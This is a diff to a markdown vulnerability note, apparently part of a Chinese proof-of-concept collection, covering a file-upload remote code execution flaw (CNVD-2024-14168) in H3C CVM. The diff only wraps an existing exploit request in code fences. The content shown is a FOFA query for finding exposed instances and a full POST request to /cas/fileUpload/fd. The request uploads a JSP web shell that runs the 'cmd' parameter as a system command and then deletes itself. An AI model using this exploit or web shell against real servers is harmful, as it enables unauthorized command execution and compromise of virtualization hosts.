@@ -85,6 +85,7 @@ FOFA：app="H3C-CVM"
 
 POC/EXP：
 
+```
 POST /cas/fileUpload/fd HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.123 Safari/537.36
@@ -102,6 +103,8 @@ Content-Type: image/png
 
 <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 --WebKitFormBoundaryMMqEBbEFHlzOcYq4--
+```
+
 
 ![image-20241107155524091](./.resource/H3CCVMcasfileUploadfd文件上传致RCE漏洞CNVD-2024-14168/media/image-20241107155524091.png)
 
